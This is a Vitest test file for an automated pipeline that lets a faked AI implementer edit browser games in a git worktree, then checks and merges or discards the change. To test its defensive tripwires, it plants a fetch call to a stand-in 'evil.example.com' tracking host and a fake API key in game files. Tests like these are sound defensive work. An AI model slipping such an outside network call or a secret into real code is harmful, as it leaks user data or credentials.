// runCandidate against a real temp git repo shaped like the studio repo. Claude, scorers, shots, tests and typecheck are fakes.
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { parseTrailers, type ScoreReport, type Ticket } from '@studio/core/hal';
import { checkEnv, IMPLEMENTER_TIMEOUT_MS, runCandidate, runNpmCheck, scorersFor, type CandidateCtx, type CandidateResult } from './candidate.js';
import type { ClaudeCall, ClaudeResult } from './claude.js';
import { ensureMainWorktree, runGit, squashMerge, type GitRunner } from './git.js';

const KEY = 'sk-ant-api03-FAKEKEYFAKEKEYFAKEKEY0123456789';
const gitIn = (cwd: string, ...args: string[]) => execFileSync('git', args, { cwd, encoding: 'utf8' }).trim();
const put = (root: string, rel: string, data: string | Buffer) => { mkdirSync(dirname(join(root, rel)), { recursive: true }); writeFileSync(join(root, rel), data); };
const read = (root: string, rel: string) => readFileSync(join(root, rel), 'utf8');

const GAME = (slug: string, version: string, extra = '') => ({
  [`games/${slug}/game.yaml`]: `slug: ${slug}\ntitle: ${slug}\nversion: ${version}\nageRating: null\n`,
  [`games/${slug}/index.html`]: `<!doctype html>\n<script type="module">\nimport { createStudio } from '../sdk/studio-sdk.js';\nconst studio = createStudio({ game: '${slug}', version: '${version}', endpoint: '' });\n${extra}</script>\n`,
  [`games/${slug}/CHANGELOG.md`]: `# ${slug} changelog\n\nNewest first.\n\n## ${version} (2026-11-10)\n- First release.\n`,
  [`games/${slug}/game.js`]: `export const speed = 1;\n`,
});

const report = (game: string, fitness: number, measures: Record<string, number>, hardFailures: string[] = []): ScoreReport<unknown> => ({ game, levels: [], measures, fitness, hardFailures });
const ok = (text: string, costUsd: number | null = 0.42): ClaudeResult => ({ ok: true, text, costUsd, subtype: 'success', limitHit: false, timedOut: false, stderrTail: '' });
const OUT = 'All done.\n{"changelog": "Jumps feel smoother.", "summary": "Tuned speed."}';
const JPEG = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 1, 2, 3, 0xff, 0xd9]);

const ticket = (over: Partial<Ticket> = {}): Ticket => ({ id: 't1', game: 'hyperline', kind: 'tuning', title: 'Smoother jumps', why: 'Players miss the second jump.', ...over });

describe('runCandidate (temp git repo)', () => {
  let repo: string, mainDir: string;
  let calls: ClaudeCall[];
  let squashes: number;

  beforeEach(async () => {
    repo = realpathSync(mkdtempSync(join(tmpdir(), 'hal-cand-')));
    gitIn(repo, 'init', '-q', '-b', 'main');
    for (const [k, v] of [['user.name', 't'], ['user.email', 't@t'], ['commit.gpgsign', 'false'], ['core.hooksPath', join(repo, '.git/hooks')]]) gitIn(repo, 'config', k!, v!);
    put(repo, '.gitignore', 'node_modules/\n.data/\n');
    put(repo, 'package.json', '{"name":"x"}\n');
    for (const [p, t] of Object.entries({ ...GAME('hyperline', '0.3.1'), ...GAME('gearhold', '0.2.0') })) put(repo, p, t);
    gitIn(repo, 'add', '-A');
    gitIn(repo, 'commit', '-q', '-m', 'base');
    mainDir = (await ensureMainWorktree(repo)).dir;
    calls = [];
    squashes = 0;
  });
  afterEach(() => rmSync(repo, { recursive: true, force: true }));

  const mainHead = () => gitIn(repo, 'rev-parse', 'refs/heads/main');
  const worktreesGone = (pass = 'HAL-1') => {
    expect(existsSync(join(repo, '.data/hal/wt', pass))).toBe(false);
    expect(gitIn(repo, 'branch', '--list', `hal/${pass}`)).toBe('');
  };

  /** A ctx whose fakes all pass. `edit` is what the fake Claude does in its cwd. */
  function ctx(over: Partial<CandidateCtx> = {}, edit: (cwd: string) => void = (cwd) => put(cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n')): CandidateCtx & { budget: { slice: ReturnType<typeof vi.fn>; record: ReturnType<typeof vi.fn> } } {
    const before = { hyperline: report('hyperline', 60, { flow: 60, fair: 70 }), gearhold: report('gearhold', 50, { walk: 50 }), 'gearhold-play': report('gearhold-play', 40, { clear: 40 }) };
    return {
      repo, pass: 'HAL-1', run: 'run-2026-11-11', now: () => new Date('2026-11-12T03:00:00Z'), tzOffsetMinutes: 0,
      model: 'test-model', billing: 'api', secrets: [KEY],
      budget: { slice: vi.fn(() => 3), record: vi.fn() },
      claude: async (call) => { calls.push(call); edit(call.cwd); return { first: ok(OUT) }; },
      mainDir,
      scoresBefore: before,
      score: async (_dir, scorer) => ({ ...before[scorer as keyof typeof before], fitness: before[scorer as keyof typeof before].fitness + 1 }),
      runTests: async () => ({ ok: true, output: 'all green' }),
      typecheck: async () => ({ ok: true, output: '' }),
      screens: async (_dir, game) => ({ game, shots: [], errors: [], reached: true, notes: [], blockedRequests: [] }),
      controls: async (_dir, game) => [{ game, check: 'tap', ok: true, detail: '' }, { game: 'other', check: 'x', ok: false, detail: 'not ours' }],
      shoot: async (_dir, _game, out) => { mkdirSync(dirname(out), { recursive: true }); writeFileSync(out, JPEG); },
      countTests: async () => ({ before: 3, after: 3 }),
      squash: async (...a) => { squashes++; return squashMerge(...a); },
      ...over,
    } as CandidateCtx & { budget: { slice: ReturnType<typeof vi.fn>; record: ReturnType<typeof vi.fn> } };
  }

  const expectDiscarded = (r: CandidateResult, old: string, re: RegExp) => {
    expect(r.verdict).toBe('discarded');
    expect(r.reasons.join('\n')).toMatch(re);
    expect(mainHead()).toBe(old);
    expect(squashes).toBe(0);
    expect(r.reasons.join('\n')).not.toContain(KEY);
    worktreesGone();
  };

  it('happy path: one squash commit on main with trailers, the version bumped in all three files, and the history jpgs', async () => {
    const old = mainHead();
    const c = ctx();
    const r = await runCandidate(ticket(), c);
    expect(r.reasons).toEqual([]);
    expect(r.verdict).toBe('merged');
    expect(r.commit).toBe(mainHead());
    expect(gitIn(repo, 'rev-parse', 'main^')).toBe(old);
    expect(gitIn(repo, 'rev-list', '--count', `${old}..main`)).toBe('1');
    expect(r.version).toBe('0.3.2');
    expect(r.changelog).toBe('Jumps feel smoother.');
    expect(r.costUsd).toBe(0.42);
    expect(r.scoresAfter.hyperline!.fitness).toBe(61);
    expect(c.budget.record).toHaveBeenCalledWith('implementer', 'api', 0.42);

    // Commit message: subject, why, trailers.
    const msg = gitIn(repo, 'log', '-1', '--format=%B', 'main');
    expect(msg.split('\n')[0]).toBe('tuning(hyperline): Smoother jumps');
    expect(msg).toContain('Players miss the second jump.');
    expect(parseTrailers(msg)).toEqual({ pass: 'HAL-1', game: 'hyperline', kind: 'tuning', why: 'Players miss the second jump.', scoreBefore: 60, scoreAfter: 61, version: '0.3.2', run: 'run-2026-11-11' });

    // The three version places agree (the game-versions check), at main's tip.
    const at = (f: string) => gitIn(repo, 'show', `main:games/hyperline/${f}`);
    expect(at('game.yaml')).toMatch(/^version: 0\.3\.2$/m);
    expect(at('index.html')).toContain("createStudio({ game: 'hyperline', version: '0.3.2'");
    expect(at('CHANGELOG.md')).toMatch(/^## 0\.3\.2 \(2026-11-11\)\n- Jumps feel smoother\.\n\n## 0\.3\.1 \(2026-11-10\)/m);
    expect(at('game.js')).toBe('export const speed = 1.2;');

    // History images are in the commit.
    const files = gitIn(repo, 'show', '--name-only', '--format=', 'main').split('\n').sort();
    expect(files).toEqual(['docs/hal/history/hyperline/2026-11-11/HAL-1-after.jpg', 'docs/hal/history/hyperline/2026-11-11/HAL-1-before.jpg', 'games/hyperline/CHANGELOG.md', 'games/hyperline/game.js', 'games/hyperline/game.yaml', 'games/hyperline/index.html']);
    expect(r.shots).toEqual({ before: 'docs/hal/history/hyperline/2026-11-11/HAL-1-before.jpg', after: 'docs/hal/history/hyperline/2026-11-11/HAL-1-after.jpg' });

    // The implementer call: right cwd, role, model, default 20 min timeout, ticket as data, no key.
    expect(calls).toHaveLength(1);
    expect(calls[0]).toMatchObject({ role: 'implementer', cwd: join(repo, '.data/hal/wt/HAL-1'), model: 'test-model', billing: 'api', maxBudgetUsd: 3, timeoutMs: IMPLEMENTER_TIMEOUT_MS });
    expect(IMPLEMENTER_TIMEOUT_MS).toBe(20 * 60_000);
    expect(calls[0]!.prompt).toContain('Smoother jumps');
    expect(calls[0]!.prompt).toContain('games/hyperline/');
    expect(calls[0]!.prompt).not.toContain(KEY);
    expect(calls[0]!.prompt).not.toMatch(/\{\{\w+\}\}/);

    // Main's worktree is at the new commit and clean; Brian's checkout files are untouched.
    expect(gitIn(mainDir, 'rev-parse', 'HEAD')).toBe(mainHead());
    expect(gitIn(mainDir, 'status', '--porcelain')).toBe('');
    expect(read(repo, 'games/hyperline/game.js')).toBe('export const speed = 1;\n');
    worktreesGone();
  });

  it('a second change the same night shares the version and adds a bullet', async () => {
    expect((await runCandidate(ticket(), ctx())).verdict).toBe('merged');
    await ensureMainWorktree(repo);
    const r = await runCandidate(ticket({ id: 't2', title: 'Brighter coins', kind: 'polish' }), ctx({ pass: 'HAL-2' }, (cwd) => put(cwd, 'games/hyperline/game.js', 'export const speed = 1.3;\n')));
    expect(r.verdict).toBe('merged');
    expect(r.version).toBe('0.3.2');
    expect(gitIn(repo, 'show', 'main:games/hyperline/CHANGELOG.md')).toMatch(/## 0\.3\.2 \(2026-11-11\)\n- Jumps feel smoother\.\n- Jumps feel smoother\.\n/);
    worktreesGone('HAL-2');
  });

  it('a zero budget slice skips with no Claude call and no worktree', async () => {
    const old = mainHead();
    const c = ctx({ budget: { slice: vi.fn(() => 0), record: vi.fn() } });
    const r = await runCandidate(ticket(), c);
    expect(r).toMatchObject({ verdict: 'skipped', reasons: ['budget'], costUsd: 0 });
    expect(calls).toHaveLength(0);
    expect(c.budget.record).not.toHaveBeenCalled();
    expect(mainHead()).toBe(old);
    worktreesGone();
  });

  it('a failed or timed-out implementer call is discarded, and its cost recorded (unknown cost as null)', async () => {
    const old = mainHead();
    const c = ctx({ claude: async (call) => { calls.push(call); return { first: { ...ok('', null), ok: false, subtype: 'timeout', timedOut: true } }; } });
    const r = await runCandidate(ticket(), c);
    expectDiscarded(r, old, /implementer timed out/);
    expect(c.budget.record).toHaveBeenCalledWith('implementer', 'api', null);
    expect(r.costUsd).toBe(3); // unknown API cost counts as the whole slice
  });

  it('records both calls when a subscription limit falls back to the API', async () => {
    const c = ctx({
      billing: 'subscription',
      claude: async (call, apiSlice) => {
        calls.push(call);
        put(call.cwd, 'games/hyperline/game.js', 'export const speed = 2;\n');
        return { first: { ...ok('limit', null), ok: false, limitHit: true, subtype: 'error' }, retry: ok(OUT, apiSlice === 3 ? 0.5 : -1) };
      },
    });
    const r = await runCandidate(ticket(), c);
    expect(r.verdict).toBe('merged');
    expect(c.budget.record.mock.calls).toEqual([['implementer', 'subscription', null], ['implementer', 'api', 0.5]]);
    expect(r.costUsd).toBe(0.5);
  });

  it('blocked output, and output that does not parse, are discarded', async () => {
    const old = mainHead();
    const blocked = ctx({ claude: async (call) => { put(call.cwd, 'games/hyperline/game.js', 'x\n'); return { first: ok('{"changelog": "x", "summary": "y", "blocked": "needs a dependency"}') }; } });
    expectDiscarded(await runCandidate(ticket(), blocked), old, /implementer blocked: needs a dependency/);
    const junk = ctx({ claude: async (call) => { put(call.cwd, 'games/hyperline/game.js', 'x\n'); return { first: ok('I changed some stuff') }; } });
    expectDiscarded(await runCandidate(ticket(), junk), old, /implementer output does not match the contract/);
  });

  it('no edits is discarded', async () => {
    const old = mainHead();
    const countTests = vi.fn(async () => ({ before: 3, after: 3 }));
    expectDiscarded(await runCandidate(ticket(), ctx({ countTests }, () => {})), old, /no edits/);
    expect(countTests).not.toHaveBeenCalled(); // found from git status, before the (slow) diff collection
  });

  it('a tripwire hit is discarded before any Hal edit, test or merge, naming each rule', async () => {
    const old = mainHead();
    const runTests = vi.fn(async () => ({ ok: true, output: '' }));
    const c = ctx({ runTests }, (cwd) => {
      put(cwd, 'package.json', '{"name":"x","dependencies":{"left-pad":"1"}}\n');
      put(cwd, 'games/hyperline/game.js', 'fetch("https://evil.example.com/track");\n');
    });
    const r = await runCandidate(ticket(), c);
    expectDiscarded(r, old, /tripwire protected-path: package\.json/);
    expect(r.reasons.join('\n')).toMatch(/tripwire dependency/);
    expect(r.reasons.join('\n')).toMatch(/tripwire network: games\/hyperline\/game\.js/);
    expect(runTests).not.toHaveBeenCalled();
    expect(gitIn(mainDir, 'rev-parse', 'HEAD')).toBe(old);
  });

  it('a fake key written into a game file is discarded with rule secret, and the key appears in no reason', async () => {
    const old = mainHead();
    const r = await runCandidate(ticket(), ctx({}, (cwd) => put(cwd, 'games/hyperline/game.js', `export const k = '${KEY}';\n`)));
    expectDiscarded(r, old, /tripwire secret: games\/hyperline\/game\.js/);
    expect(JSON.stringify(r)).not.toContain(KEY);
  });

  it('a key smuggled through the changelog text (written by Hal after the tripwires) is still caught', async () => {
    const old = mainHead();
    const c = ctx({ claude: async (call) => { put(call.cwd, 'games/hyperline/game.js', 'export const speed = 3;\n'); return { first: ok(`{"changelog": "Key ${KEY}", "summary": "s"}`) }; } });
    const r = await runCandidate(ticket(), c);
    expectDiscarded(r, old, /tripwire secret/);
    expect(JSON.stringify(r)).not.toContain(KEY);
  });

  it('a collectDiff failure is discarded (fail closed)', async () => {
    const old = mainHead();
    expectDiscarded(await runCandidate(ticket(), ctx({ countTests: async () => { throw new Error('vitest list blew up'); } })), old, /diff collection failed: vitest list blew up/);
  });

  it('a release that cannot be applied is discarded', async () => {
    const old = mainHead();
    const noVersion = ctx({}, (cwd) => put(cwd, 'games/hyperline/game.yaml', 'slug: hyperline\ntitle: hyperline\n'));
    expectDiscarded(await runCandidate(ticket(), noVersion), old, /release failed: .*no version/);
  });

  it('failing tests are discarded with the output tail, key redacted', async () => {
    const old = mainHead();
    const r = await runCandidate(ticket(), ctx({ runTests: async () => ({ ok: false, output: `${'noise\n'.repeat(2000)}FAIL games/hyperline.test.ts: expected 1 got 2 (${KEY})` }) }));
    expectDiscarded(r, old, /npm test failed[\s\S]*FAIL games\/hyperline\.test\.ts: expected 1 got 2 \(\[REDACTED\]\)/);
    expect(r.reasons.join('\n').length).toBeLessThan(4000);
  });

  it('a failing typecheck is discarded', async () => {
    const old = mainHead();
    expectDiscarded(await runCandidate(ticket(), ctx({ typecheck: async () => ({ ok: false, output: 'TS2322: nope' }) })), old, /npm run typecheck failed[\s\S]*TS2322/);
  });

  it('a score regression past the tolerance is discarded; a target picks score mode', async () => {
    const old = mainHead();
    const regress = ctx({ score: async () => report('hyperline', 60, { flow: 60, fair: 65 }) });
    expectDiscarded(await runCandidate(ticket(), regress), old, /hyperline: fair regressed/);
    squashes = 0;
    const noGain = ctx({ score: async () => report('hyperline', 60, { flow: 60.2, fair: 70 }) });
    expectDiscarded(await runCandidate(ticket({ target: 'flow' }), noGain), old, /hyperline: no real gain/);
    squashes = 0;
    const throws = ctx({ score: async () => { throw new Error('browser unavailable: no gpu'); } });
    expectDiscarded(await runCandidate(ticket(), throws), old, /score hyperline failed: browser unavailable/);
    squashes = 0;
    expectDiscarded(await runCandidate(ticket(), ctx({ scoresBefore: {} })), old, /hyperline: no baseline/);
    squashes = 0;
    expectDiscarded(await runCandidate(ticket({ target: 'nosuch' }), ctx()), old, /target measure "nosuch"/);
  });

  it('gearhold is scored with both gearhold and gearhold-play, and the target applies where it is a measure', async () => {
    expect(scorersFor('gearhold')).toEqual(['gearhold', 'gearhold-play']);
    expect(scorersFor('hyperline')).toEqual(['hyperline']);
    const scored: string[] = [];
    const c = ctx({
      score: async (dir, s) => { scored.push(s); expect(dir).toBe(join(repo, '.data/hal/wt/HAL-1')); return s === 'gearhold-play' ? report(s, 42, { clear: 42 }) : report(s, 50, { walk: 50 }); },
    }, (cwd) => put(cwd, 'games/gearhold/game.js', 'export const speed = 1.5;\n'));
    const r = await runCandidate(ticket({ game: 'gearhold', target: 'clear', kind: 'feature' }), c);
    expect(r.reasons).toEqual([]);
    expect(scored).toEqual(['gearhold', 'gearhold-play']);
    expect(r.version).toBe('0.3.0'); // feature: minor bump of 0.2.0
    expect(parseTrailers(gitIn(repo, 'log', '-1', '--format=%B', 'main'))).toMatchObject({ scoreBefore: 40, scoreAfter: 42, kind: 'feature', game: 'gearhold' });
  });

  it('failing screens or controls for the game are discarded', async () => {
    const old = mainHead();
    const screens = ctx({ screens: async (_d, game) => ({ game, shots: [], errors: ['pageerror: boom'], reached: true, notes: [], blockedRequests: ['https://x.example/'] }) });
    const r = await runCandidate(ticket(), screens);
    expectDiscarded(r, old, /screens hyperline: pageerror: boom/);
    expect(r.reasons.join('\n')).toMatch(/blocked request https:\/\/x\.example\//);
    squashes = 0;
    expectDiscarded(await runCandidate(ticket(), ctx({ screens: async (_d, game) => ({ game, shots: [], errors: [], reached: false, notes: [], blockedRequests: [] }) })), old, /did not reach gameplay/);
    squashes = 0;
    expectDiscarded(await runCandidate(ticket(), ctx({ controls: async (_d, game) => [{ game, check: 'tap', ok: false, detail: 'no response' }] })), old, /controls hyperline tap: no response/);
    squashes = 0;
    expectDiscarded(await runCandidate(ticket(), ctx({ controls: async () => [] })), old, /no controls checks/);
  });

  it('files changed by the checks themselves (e.g. a test that writes into the tree) are discarded', async () => {
    const old = mainHead();
    const c = ctx({ runTests: async (dir) => { put(dir, 'games/hyperline/game.js', `export const k = '${KEY}';\n`); return { ok: true, output: '' }; } });
    expectDiscarded(await runCandidate(ticket(), c), old, /worktree changed while the checks ran/);
  });

  it('a squash failure leaves main at its old HEAD with a clean tree', async () => {
    const old = mainHead();
    const failing: GitRunner = async (args, cwd) => { if (args[0] === 'commit' && cwd === mainDir) throw new Error('commit failed in main'); return runGit(args, cwd); };
    const r = await runCandidate(ticket(), ctx({ git: failing, squash: async (repo, pass, msg) => { squashes++; return squashMerge(repo, pass, msg, { git: failing }); } }));
    expect(r.verdict).toBe('discarded');
    expect(r.reasons.join('\n')).toMatch(/squash merge failed: .*commit failed in main/);
    expect(squashes).toBe(1);
    expect(mainHead()).toBe(old);
    expect(gitIn(mainDir, 'rev-parse', 'HEAD')).toBe(old);
    expect(gitIn(mainDir, 'status', '--porcelain', '--untracked-files=all')).toBe('');
    worktreesGone();
  });

  it('a thrown error anywhere is a discard, and the worktree and branch are still removed', async () => {
    const old = mainHead();
    expectDiscarded(await runCandidate(ticket(), ctx({ shoot: async () => { throw new Error(`shot failed ${KEY}`); } })), old, /before shot failed: shot failed \[REDACTED\]/);
    squashes = 0;
    expectDiscarded(await runCandidate(ticket(), ctx({ claude: async () => { throw new Error('spawn exploded'); } })), old, /spawn exploded/);
    squashes = 0;
    expectDiscarded(await runCandidate(ticket(), ctx({ typecheck: async () => { throw new Error('tsc crashed'); } })), old, /tsc crashed/);
    squashes = 0;
    let n = 0;
    const afterFails = ctx({ shoot: async (_d, _g, out) => { if (n++ === 1) throw new Error('after shot broke'); mkdirSync(dirname(out), { recursive: true }); writeFileSync(out, JPEG); } });
    expectDiscarded(await runCandidate(ticket(), afterFails), old, /after shot failed: after shot broke/);
  });

  it('a game slug that is not a plain name, or not a game in the repo, is discarded before anything runs', async () => {
    const old = mainHead();
    expectDiscarded(await runCandidate(ticket({ game: '../etc' }), ctx()), old, /bad game/);
    squashes = 0;
    expectDiscarded(await runCandidate(ticket({ game: 'nosuch' }), ctx()), old, /bad game/);
    expect(calls).toHaveLength(0);
  });
});

describe('runNpmCheck', () => {
  it('runs with no key in the env, and reports exit codes and timeouts as failures', async () => {
    const env = { PATH: process.env.PATH, ANTHROPIC_API_KEY: KEY, OTHER: `x${KEY}`, HAL_TOKEN: 't', KEEP: 'yes' };
    expect(checkEnv(env, [KEY])).toEqual({ PATH: process.env.PATH, KEEP: 'yes' });
    const script = 'console.log(JSON.stringify([process.env.ANTHROPIC_API_KEY ?? null, process.env.OTHER ?? null, process.env.KEEP])); process.exit(Number(process.argv[1]))';
    const good = await runNpmCheck(tmpdir(), ['-e', script, '0'], { cmd: process.execPath, env, secrets: [KEY] });
    expect(good).toEqual({ ok: true, output: '[null,null,"yes"]\n' });
    const bad = await runNpmCheck(tmpdir(), ['-e', script, '3'], { cmd: process.execPath, env, secrets: [KEY] });
    expect(bad.ok).toBe(false);
    expect(bad.output).toContain('[null,null,"yes"]');
    const slow = await runNpmCheck(tmpdir(), ['-e', 'setTimeout(() => {}, 10000)'], { cmd: process.execPath, timeoutMs: 200 });
    expect(slow).toMatchObject({ ok: false, output: expect.stringContaining('timed out') });
  });
});
